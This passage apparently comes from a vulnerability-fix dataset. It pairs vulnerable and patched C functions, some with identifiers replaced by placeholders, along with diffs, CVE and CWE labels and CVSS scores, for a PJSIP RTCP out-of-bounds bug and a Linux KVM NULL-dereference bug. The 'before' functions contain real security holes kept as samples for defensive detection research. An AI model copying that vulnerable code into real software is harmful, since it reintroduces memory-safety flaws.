    sess->tv_base = now;
    pj_get_timestamp(&sess->ts_base);
    pj_get_timestamp_freq(&sess->ts_freq);
    sess->rtp_ts_base = settings->rtp_ts_base;

    /* Initialize statistics states */
    pjmedia_rtcp_init_stat(&sess->stat);

    /* RR will be initialized on receipt of the first RTP packet. */
}","VAR_0(void) pjmedia_rtcp_init2( pjmedia_rtcp_session *VAR_1,
				 const pjmedia_rtcp_session_setting *VAR_2)
{
    pjmedia_rtcp_sr_pkt *VAR_3 = &VAR_1->rtcp_sr_pkt;
    pj_time_val VAR_4;
    
    /* COMMENT_0 */
    pj_bzero(VAR_1, sizeof(pjmedia_rtcp_session));

    /* COMMENT_1 */
    VAR_1->rtp_last_ts = (unsigned)-1;

    /* COMMENT_2 */
    VAR_1->name = VAR_2->name ? VAR_2->name : (char*)VAR_5;

    /* COMMENT_3 */
    VAR_1->clock_rate = VAR_2->clock_rate;
    VAR_1->pkt_size = VAR_2->samples_per_frame;

    /* COMMENT_4 */
    VAR_3->common.version = 2;
    VAR_3->common.count = 1;
    VAR_3->common.pt = VAR_6;
    VAR_3->common.length = pj_htons(12);
    VAR_3->common.ssrc = pj_htonl(VAR_2->ssrc);
    
    /* COMMENT_5 */
    pj_memcpy(&VAR_1->rtcp_rr_pkt.common, &VAR_3->common, 
	      sizeof(VAR_7));
    VAR_1->rtcp_rr_pkt.common.pt = VAR_8;
    VAR_1->rtcp_rr_pkt.common.length = pj_htons(7);

    /* COMMENT_6 */
    pj_memcpy(&VAR_1->rtcp_fb_com, &VAR_3->common, 
	      sizeof(VAR_7));
    VAR_1->rtcp_fb_com.ssrc_src = 0;

    /* COMMENT_7 */
    pj_gettimeofday(&VAR_4);
    VAR_1->tv_base = VAR_4;
    pj_get_timestamp(&VAR_1->ts_base);
    pj_get_timestamp_freq(&VAR_1->ts_freq);
    VAR_1->rtp_ts_base = VAR_2->rtp_ts_base;

    /* COMMENT_8 */
    pjmedia_rtcp_init_stat(&VAR_1->stat);

    /* COMMENT_9 */
}",,"--- func_before
+++ func_after
@@ -30,6 +30,11 @@
     sess->rtcp_rr_pkt.common.pt = RTCP_RR;
     sess->rtcp_rr_pkt.common.length = pj_htons(7);
 
+    /* Copy to RTCP FB common header */
+    pj_memcpy(&sess->rtcp_fb_com, &sr_pkt->common, 
+	      sizeof(pjmedia_rtcp_common));
+    sess->rtcp_fb_com.ssrc_src = 0;
+
     /* Get time and timestamp base and frequency */
     pj_gettimeofday(&now);
     sess->tv_base = now;","{'deleted_lines': [], 'added_lines': ['    /* Copy to RTCP FB common header */', '    pj_memcpy(&sess->rtcp_fb_com, &sr_pkt->common, ', '\t      sizeof(pjmedia_rtcp_common));', '    sess->rtcp_fb_com.ssrc_src = 0;', '']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_build_sli,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_sli(
pjmedia_rtcp_session *session, 
void *buf,
pj_size_t *length,
unsigned sli_cnt,
const pjmedia_rtcp_fb_sli sli[])
{
pjmedia_rtcp_common *hdr;
pj_uint8_t *p;
unsigned len, i;
PJ_ASSERT_RETURN(session && buf && length && sli_cnt && sli, PJ_EINVAL);
len = (3 + sli_cnt) * 4;
if (len > *length)
return PJ_ETOOSMALL;
hdr = (pjmedia_rtcp_common*)buf;
pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
hdr->pt = RTCP_PSFB;
hdr->count = 2; 
hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
p = (pj_uint8_t*)hdr + sizeof(*hdr);
for (i = 0; i < sli_cnt; ++i) {
*p++  = (pj_uint8_t)((sli[i].first >> 5) & 0xFF);   
*p    = (pj_uint8_t)((sli[i].first & 31) << 3);    
*p++ |= (pj_uint8_t)((sli[i].number >> 10) & 7);    
*p++  = (pj_uint8_t)((sli[i].number >> 2) & 0xFF);  
*p    = (pj_uint8_t)((sli[i].number & 3) << 6);    
*p++ |= (sli[i].pict_id & 63);
}
*length = len;
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_sli(
pjmedia_rtcp_session *VAR_1, 
void *VAR_2,
pj_size_t *VAR_3,
unsigned VAR_4,
const pjmedia_rtcp_fb_sli VAR_5[])
{
pjmedia_rtcp_common *VAR_6;
pj_uint8_t *VAR_7;
unsigned VAR_8, VAR_9;
PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4 && VAR_5, VAR_10);
VAR_8 = (3 + VAR_4) * 4;
if (VAR_8 > *VAR_3)
return VAR_11;
VAR_6 = (pjmedia_rtcp_common*)VAR_2;
pj_memcpy(VAR_6, &VAR_1->rtcp_rr_pkt.common,  sizeof(*VAR_6));
VAR_6->pt = VAR_12;
VAR_6->count = 2; 
VAR_6->length = pj_htons((VAR_13)(VAR_8/4 - 1));
VAR_7 = (pj_uint8_t*)VAR_6 + sizeof(*VAR_6);
for (VAR_9 = 0; VAR_9 < VAR_4; ++VAR_9) {
*VAR_7++  = (pj_uint8_t)((VAR_5[VAR_9].first >> 5) & 0xFF);   
*VAR_7    = (pj_uint8_t)((VAR_5[VAR_9].first & 31) << 3);    
*VAR_7++ |= (pj_uint8_t)((VAR_5[VAR_9].number >> 10) & 7);    
*VAR_7++  = (pj_uint8_t)((VAR_5[VAR_9].number >> 2) & 0xFF);  
*VAR_7    = (pj_uint8_t)((VAR_5[VAR_9].number & 3) << 6);    
*VAR_7++ |= (VAR_5[VAR_9].pict_id & 63);
}
*VAR_3 = VAR_8;
return VAR_14;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_sli(
					pjmedia_rtcp_session *session, 
					void *buf,
					pj_size_t *length,
					unsigned sli_cnt,
					const pjmedia_rtcp_fb_sli sli[])
{
    pjmedia_rtcp_fb_common *hdr;
    pj_uint8_t *p;
    unsigned len, i;

    PJ_ASSERT_RETURN(session && buf && length && sli_cnt && sli, PJ_EINVAL);

    len = (3 + sli_cnt) * 4;
    if (len > *length)
	return PJ_ETOOSMALL;

    /* Build RTCP-FB SLI header */
    hdr = (pjmedia_rtcp_fb_common*)buf;
    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
    hdr->rtcp_common.pt = RTCP_PSFB;
    hdr->rtcp_common.count = 2; /* FMT = 2 */
    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));

    /* Build RTCP-FB SLI FCI */
    p = (pj_uint8_t*)hdr + sizeof(*hdr);
    for (i = 0; i < sli_cnt; ++i) {
	/* 'first' takes 13 bit */
	*p++  = (pj_uint8_t)((sli[i].first >> 5) & 0xFF);   /* 8 MSB bits */
	*p    = (pj_uint8_t)((sli[i].first & 31) << 3);	    /* 5 LSB bits */
	/* 'number' takes 13 bit */
	*p++ |= (pj_uint8_t)((sli[i].number >> 10) & 7);    /* 3 MSB bits */
	*p++  = (pj_uint8_t)((sli[i].number >> 2) & 0xFF);  /* 8 mid bits */
	*p    = (pj_uint8_t)((sli[i].number & 3) << 6);	    /* 2 LSB bits */
	/* 'pict_id' takes 6 bit */
	*p++ |= (sli[i].pict_id & 63);
    }

    /* Finally */
    *length = len;

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_sli(
					pjmedia_rtcp_session *VAR_1, 
					void *VAR_2,
					pj_size_t *VAR_3,
					unsigned VAR_4,
					const pjmedia_rtcp_fb_sli VAR_5[])
{
    pjmedia_rtcp_fb_common *VAR_6;
    pj_uint8_t *VAR_7;
    unsigned VAR_8, VAR_9;

    PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4 && VAR_5, VAR_10);

    VAR_8 = (3 + VAR_4) * 4;
    if (VAR_8 > *VAR_3)
	return VAR_11;

    /* COMMENT_0 */
    VAR_6 = (pjmedia_rtcp_fb_common*)VAR_2;
    pj_memcpy(VAR_6, &VAR_1->rtcp_fb_com, sizeof(*VAR_6));
    VAR_6->rtcp_common.pt = VAR_12;
    VAR_6->rtcp_common.count = 2; /* COMMENT_1 */
    VAR_6->rtcp_common.length = pj_htons((VAR_13)(VAR_8/4 - 1));

    /* COMMENT_2 */
    VAR_7 = (pj_uint8_t*)VAR_6 + sizeof(*VAR_6);
    for (VAR_9 = 0; VAR_9 < VAR_4; ++VAR_9) {
	/* COMMENT_3 */
	*VAR_7++  = (pj_uint8_t)((VAR_5[VAR_9].first >> 5) & 0xFF);   /* COMMENT_4 */
	*VAR_7    = (pj_uint8_t)((VAR_5[VAR_9].first & 31) << 3);	    /* COMMENT_5 */
	/* COMMENT_6 */
	*VAR_7++ |= (pj_uint8_t)((VAR_5[VAR_9].number >> 10) & 7);    /* COMMENT_7 */
	*VAR_7++  = (pj_uint8_t)((VAR_5[VAR_9].number >> 2) & 0xFF);  /* COMMENT_8 */
	*VAR_7    = (pj_uint8_t)((VAR_5[VAR_9].number & 3) << 6);	    /* COMMENT_9 */
	/* COMMENT_10 */
	*VAR_7++ |= (VAR_5[VAR_9].pict_id & 63);
    }

    /* COMMENT_11 */
    *VAR_3 = VAR_8;

    return VAR_14;
}",,"--- func_before
+++ func_after
@@ -5,7 +5,7 @@
 					unsigned sli_cnt,
 					const pjmedia_rtcp_fb_sli sli[])
 {
-    pjmedia_rtcp_common *hdr;
+    pjmedia_rtcp_fb_common *hdr;
     pj_uint8_t *p;
     unsigned len, i;
 
@@ -16,11 +16,11 @@
 	return PJ_ETOOSMALL;
 
     /* Build RTCP-FB SLI header */
-    hdr = (pjmedia_rtcp_common*)buf;
-    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
-    hdr->pt = RTCP_PSFB;
-    hdr->count = 2; /* FMT = 2 */
-    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
+    hdr = (pjmedia_rtcp_fb_common*)buf;
+    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
+    hdr->rtcp_common.pt = RTCP_PSFB;
+    hdr->rtcp_common.count = 2; /* FMT = 2 */
+    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));
 
     /* Build RTCP-FB SLI FCI */
     p = (pj_uint8_t*)hdr + sizeof(*hdr);","{'deleted_lines': ['    pjmedia_rtcp_common *hdr;', '    hdr = (pjmedia_rtcp_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));', '    hdr->pt = RTCP_PSFB;', '    hdr->count = 2; /* FMT = 2 */', '    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr;', '    hdr = (pjmedia_rtcp_fb_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));', '    hdr->rtcp_common.pt = RTCP_PSFB;', '    hdr->rtcp_common.count = 2; /* FMT = 2 */', '    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_build_pli,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_pli(
pjmedia_rtcp_session *session, 
void *buf,
pj_size_t *length)
{
pjmedia_rtcp_common *hdr;
unsigned len;
PJ_ASSERT_RETURN(session && buf && length, PJ_EINVAL);
len = 12;
if (len > *length)
return PJ_ETOOSMALL;
hdr = (pjmedia_rtcp_common*)buf;
pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
hdr->pt = RTCP_PSFB;
hdr->count = 1; 
hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
*length = len;
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_pli(
pjmedia_rtcp_session *VAR_1, 
void *VAR_2,
pj_size_t *VAR_3)
{
pjmedia_rtcp_common *VAR_4;
unsigned VAR_5;
PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3, VAR_6);
VAR_5 = 12;
if (VAR_5 > *VAR_3)
return VAR_7;
VAR_4 = (pjmedia_rtcp_common*)VAR_2;
pj_memcpy(VAR_4, &VAR_1->rtcp_rr_pkt.common,  sizeof(*VAR_4));
VAR_4->pt = VAR_8;
VAR_4->count = 1; 
VAR_4->length = pj_htons((VAR_9)(VAR_5/4 - 1));
*VAR_3 = VAR_5;
return VAR_10;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_pli(
					pjmedia_rtcp_session *session, 
					void *buf,
					pj_size_t *length)
{
    pjmedia_rtcp_fb_common *hdr;
    unsigned len;

    PJ_ASSERT_RETURN(session && buf && length, PJ_EINVAL);

    len = 12;
    if (len > *length)
	return PJ_ETOOSMALL;

    /* Build RTCP-FB PLI header */
    hdr = (pjmedia_rtcp_fb_common*)buf;
    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
    hdr->rtcp_common.pt = RTCP_PSFB;
    hdr->rtcp_common.count = 1; /* FMT = 1 */
    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));

    /* Finally */
    *length = len;

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_pli(
					pjmedia_rtcp_session *VAR_1, 
					void *VAR_2,
					pj_size_t *VAR_3)
{
    pjmedia_rtcp_fb_common *VAR_4;
    unsigned VAR_5;

    PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3, VAR_6);

    VAR_5 = 12;
    if (VAR_5 > *VAR_3)
	return VAR_7;

    /* COMMENT_0 */
    VAR_4 = (pjmedia_rtcp_fb_common*)VAR_2;
    pj_memcpy(VAR_4, &VAR_1->rtcp_fb_com, sizeof(*VAR_4));
    VAR_4->rtcp_common.pt = VAR_8;
    VAR_4->rtcp_common.count = 1; /* COMMENT_1 */
    VAR_4->rtcp_common.length = pj_htons((VAR_9)(VAR_5/4 - 1));

    /* COMMENT_2 */
    *VAR_3 = VAR_5;

    return VAR_10;
}",,"--- func_before
+++ func_after
@@ -3,7 +3,7 @@
 					void *buf,
 					pj_size_t *length)
 {
-    pjmedia_rtcp_common *hdr;
+    pjmedia_rtcp_fb_common *hdr;
     unsigned len;
 
     PJ_ASSERT_RETURN(session && buf && length, PJ_EINVAL);
@@ -13,11 +13,11 @@
 	return PJ_ETOOSMALL;
 
     /* Build RTCP-FB PLI header */
-    hdr = (pjmedia_rtcp_common*)buf;
-    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
-    hdr->pt = RTCP_PSFB;
-    hdr->count = 1; /* FMT = 1 */
-    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
+    hdr = (pjmedia_rtcp_fb_common*)buf;
+    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
+    hdr->rtcp_common.pt = RTCP_PSFB;
+    hdr->rtcp_common.count = 1; /* FMT = 1 */
+    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));
 
     /* Finally */
     *length = len;","{'deleted_lines': ['    pjmedia_rtcp_common *hdr;', '    hdr = (pjmedia_rtcp_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));', '    hdr->pt = RTCP_PSFB;', '    hdr->count = 1; /* FMT = 1 */', '    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr;', '    hdr = (pjmedia_rtcp_fb_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));', '    hdr->rtcp_common.pt = RTCP_PSFB;', '    hdr->rtcp_common.count = 1; /* FMT = 1 */', '    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_build_rpsi,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_rpsi(
pjmedia_rtcp_session *session, 
void *buf,
pj_size_t *length,
const pjmedia_rtcp_fb_rpsi *rpsi)
{
pjmedia_rtcp_common *hdr;
pj_uint8_t *p;
unsigned bitlen, padlen, len;
PJ_ASSERT_RETURN(session && buf && length && rpsi, PJ_EINVAL);
bitlen = (unsigned)rpsi->rpsi_bit_len + 16;
padlen = (32 - (bitlen % 32)) % 32;
len = (3 + (bitlen+padlen)/32) * 4;
if (len > *length)
return PJ_ETOOSMALL;
hdr = (pjmedia_rtcp_common*)buf;
pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
hdr->pt = RTCP_PSFB;
hdr->count = 3; 
hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
p = (pj_uint8_t*)hdr + sizeof(*hdr);
*p++ = (pj_uint8_t)padlen;
*p++ = rpsi->pt & 0x7F;
pj_memcpy(p, rpsi->rpsi.ptr, rpsi->rpsi_bit_len/8);
p += rpsi->rpsi_bit_len/8;
if (rpsi->rpsi_bit_len % 8) {
*p++ = *(rpsi->rpsi.ptr + rpsi->rpsi_bit_len/8);
}
if (padlen >= 8)
pj_bzero(p, padlen/8);
*length = len;
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_rpsi(
pjmedia_rtcp_session *VAR_1, 
void *VAR_2,
pj_size_t *VAR_3,
const pjmedia_rtcp_fb_rpsi *VAR_4)
{
pjmedia_rtcp_common *VAR_5;
pj_uint8_t *VAR_6;
unsigned VAR_7, VAR_8, VAR_9;
PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4, VAR_10);
VAR_7 = (unsigned)VAR_4->rpsi_bit_len + 16;
VAR_8 = (32 - (VAR_7 % 32)) % 32;
VAR_9 = (3 + (VAR_7+VAR_8)/32) * 4;
if (VAR_9 > *VAR_3)
return VAR_11;
VAR_5 = (pjmedia_rtcp_common*)VAR_2;
pj_memcpy(VAR_5, &VAR_1->rtcp_rr_pkt.common,  sizeof(*VAR_5));
VAR_5->pt = VAR_12;
VAR_5->count = 3; 
VAR_5->length = pj_htons((VAR_13)(VAR_9/4 - 1));
VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
*VAR_6++ = (pj_uint8_t)VAR_8;
*VAR_6++ = VAR_4->pt & 0x7F;
pj_memcpy(VAR_6, VAR_4->rpsi.ptr, VAR_4->rpsi_bit_len/8);
VAR_6 += VAR_4->rpsi_bit_len/8;
if (VAR_4->rpsi_bit_len % 8) {
*VAR_6++ = *(VAR_4->rpsi.ptr + VAR_4->rpsi_bit_len/8);
}
if (VAR_8 >= 8)
pj_bzero(VAR_6, VAR_8/8);
*VAR_3 = VAR_9;
return VAR_14;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_build_rpsi(
					    pjmedia_rtcp_session *session, 
					    void *buf,
					    pj_size_t *length,
					    const pjmedia_rtcp_fb_rpsi *rpsi)
{
    pjmedia_rtcp_fb_common *hdr;
    pj_uint8_t *p;
    unsigned bitlen, padlen, len;

    PJ_ASSERT_RETURN(session && buf && length && rpsi, PJ_EINVAL);

    bitlen = (unsigned)rpsi->rpsi_bit_len + 16;
    padlen = (32 - (bitlen % 32)) % 32;
    len = (3 + (bitlen+padlen)/32) * 4;
    if (len > *length)
	return PJ_ETOOSMALL;

    /* Build RTCP-FB RPSI header */
    hdr = (pjmedia_rtcp_fb_common*)buf;
    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
    hdr->rtcp_common.pt = RTCP_PSFB;
    hdr->rtcp_common.count = 3; /* FMT = 3 */
    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));

    /* Build RTCP-FB RPSI FCI */
    p = (pj_uint8_t*)hdr + sizeof(*hdr);
    /* PB (number of padding bits) */
    *p++ = (pj_uint8_t)padlen;
    /* Payload type */
    *p++ = rpsi->pt & 0x7F;
    /* RPSI bit string */
    pj_memcpy(p, rpsi->rpsi.ptr, rpsi->rpsi_bit_len/8);
    p += rpsi->rpsi_bit_len/8;
    if (rpsi->rpsi_bit_len % 8) {
	*p++ = *(rpsi->rpsi.ptr + rpsi->rpsi_bit_len/8);
    }
    /* Zero padding */
    if (padlen >= 8)
	pj_bzero(p, padlen/8);

    /* Finally */
    *length = len;

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_rpsi(
					    pjmedia_rtcp_session *VAR_1, 
					    void *VAR_2,
					    pj_size_t *VAR_3,
					    const pjmedia_rtcp_fb_rpsi *VAR_4)
{
    pjmedia_rtcp_fb_common *VAR_5;
    pj_uint8_t *VAR_6;
    unsigned VAR_7, VAR_8, VAR_9;

    PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4, VAR_10);

    VAR_7 = (unsigned)VAR_4->rpsi_bit_len + 16;
    VAR_8 = (32 - (VAR_7 % 32)) % 32;
    VAR_9 = (3 + (VAR_7+VAR_8)/32) * 4;
    if (VAR_9 > *VAR_3)
	return VAR_11;

    /* COMMENT_0 */
    VAR_5 = (pjmedia_rtcp_fb_common*)VAR_2;
    pj_memcpy(VAR_5, &VAR_1->rtcp_fb_com, sizeof(*VAR_5));
    VAR_5->rtcp_common.pt = VAR_12;
    VAR_5->rtcp_common.count = 3; /* COMMENT_1 */
    VAR_5->rtcp_common.length = pj_htons((VAR_13)(VAR_9/4 - 1));

    /* COMMENT_2 */
    VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
    /* COMMENT_3 */
    *VAR_6++ = (pj_uint8_t)VAR_8;
    /* COMMENT_4 */
    *VAR_6++ = VAR_4->pt & 0x7F;
    /* COMMENT_5 */
    pj_memcpy(VAR_6, VAR_4->rpsi.ptr, VAR_4->rpsi_bit_len/8);
    VAR_6 += VAR_4->rpsi_bit_len/8;
    if (VAR_4->rpsi_bit_len % 8) {
	*VAR_6++ = *(VAR_4->rpsi.ptr + VAR_4->rpsi_bit_len/8);
    }
    /* COMMENT_6 */
    if (VAR_8 >= 8)
	pj_bzero(VAR_6, VAR_8/8);

    /* COMMENT_7 */
    *VAR_3 = VAR_9;

    return VAR_14;
}",,"--- func_before
+++ func_after
@@ -4,7 +4,7 @@
 					    pj_size_t *length,
 					    const pjmedia_rtcp_fb_rpsi *rpsi)
 {
-    pjmedia_rtcp_common *hdr;
+    pjmedia_rtcp_fb_common *hdr;
     pj_uint8_t *p;
     unsigned bitlen, padlen, len;
 
@@ -17,11 +17,11 @@
 	return PJ_ETOOSMALL;
 
     /* Build RTCP-FB RPSI header */
-    hdr = (pjmedia_rtcp_common*)buf;
-    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
-    hdr->pt = RTCP_PSFB;
-    hdr->count = 3; /* FMT = 3 */
-    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
+    hdr = (pjmedia_rtcp_fb_common*)buf;
+    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
+    hdr->rtcp_common.pt = RTCP_PSFB;
+    hdr->rtcp_common.count = 3; /* FMT = 3 */
+    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));
 
     /* Build RTCP-FB RPSI FCI */
     p = (pj_uint8_t*)hdr + sizeof(*hdr);","{'deleted_lines': ['    pjmedia_rtcp_common *hdr;', '    hdr = (pjmedia_rtcp_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));', '    hdr->pt = RTCP_PSFB;', '    hdr->count = 3; /* FMT = 3 */', '    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr;', '    hdr = (pjmedia_rtcp_fb_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));', '    hdr->rtcp_common.pt = RTCP_PSFB;', '    hdr->rtcp_common.count = 3; /* FMT = 3 */', '    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-1263,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,torvalds/linux,"KVM: avoid NULL pointer dereference in kvm_dirty_ring_push

kvm_vcpu_release() will call kvm_dirty_ring_free(), freeing
ring->dirty_gfns and setting it to NULL.  Afterwards, it calls
kvm_arch_vcpu_destroy().

However, if closing the file descriptor races with KVM_RUN in such away
that vcpu->arch.st.preempted == 0, the following call stack leads to a
NULL pointer dereference in kvm_dirty_run_push():

 mark_page_dirty_in_slot+0x192/0x270 arch/x86/kvm/../../../virt/kvm/kvm_main.c:3171
 kvm_steal_time_set_preempted arch/x86/kvm/x86.c:4600 [inline]
 kvm_arch_vcpu_put+0x34e/0x5b0 arch/x86/kvm/x86.c:4618
 vcpu_put+0x1b/0x70 arch/x86/kvm/../../../virt/kvm/kvm_main.c:211
 vmx_free_vcpu+0xcb/0x130 arch/x86/kvm/vmx/vmx.c:6985
 kvm_arch_vcpu_destroy+0x76/0x290 arch/x86/kvm/x86.c:11219
 kvm_vcpu_destroy arch/x86/kvm/../../../virt/kvm/kvm_main.c:441 [inline]

The fix is to release the dirty page ring after kvm_arch_vcpu_destroy
has run.

Reported-by: Qiuhao Li <qiuhao@sysec.org>
Reported-by: Gaoning Pan <pgn@zju.edu.cn>
Reported-by: Yongkang Jia <kangel@zju.edu.cn>
Cc: stable@vger.kernel.org
Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",5593473a1e6c743764b08e3b6071cb43b5cfa6c4,https://github.com/torvalds/linux/commit/5593473a1e6c743764b08e3b6071cb43b5cfa6c4,virt/kvm/kvm_main.c,kvm_vcpu_destroy,"static void kvm_vcpu_destroy(struct kvm_vcpu *vcpu)
{
kvm_dirty_ring_free(&vcpu->dirty_ring);
kvm_arch_vcpu_destroy(vcpu);
put_pid(rcu_dereference_protected(vcpu->pid, 1));
free_page((unsigned long)vcpu->run);
kmem_cache_free(kvm_vcpu_cache, vcpu);
}","static void kvm_vcpu_destroy(struct kvm_vcpu *VAR_0)
{
kvm_dirty_ring_free(&VAR_0->dirty_ring);
kvm_arch_vcpu_destroy(VAR_0);
put_pid(rcu_dereference_protected(VAR_0->pid, 1));
free_page((unsigned long)VAR_0->run);
kmem_cache_free(VAR_1, VAR_0);
}",torvalds/linux/5593473a1e6c743764b08e3b6071cb43b5cfa6c4/kvm_main.c/vul/before/0.json,"static void kvm_vcpu_destroy(struct kvm_vcpu *vcpu)
{
	kvm_arch_vcpu_destroy(vcpu);
	kvm_dirty_ring_free(&vcpu->dirty_ring);

	/*
	 * No need for rcu_read_lock as VCPU_RUN is the only place that changes
	 * the vcpu->pid pointer, and at destruction time all file descriptors
	 * are already gone.
	 */
	put_pid(rcu_dereference_protected(vcpu->pid, 1));

	free_page((unsigned long)vcpu->run);
	kmem_cache_free(kvm_vcpu_cache, vcpu);
}","static void kvm_vcpu_destroy(struct kvm_vcpu *VAR_0)
{
	kvm_arch_vcpu_destroy(VAR_0);
	kvm_dirty_ring_free(&VAR_0->dirty_ring);

	/* COMMENT_0 */
                                                                        
                                                                       
                     
    
	put_pid(rcu_dereference_protected(VAR_0->pid, 1));

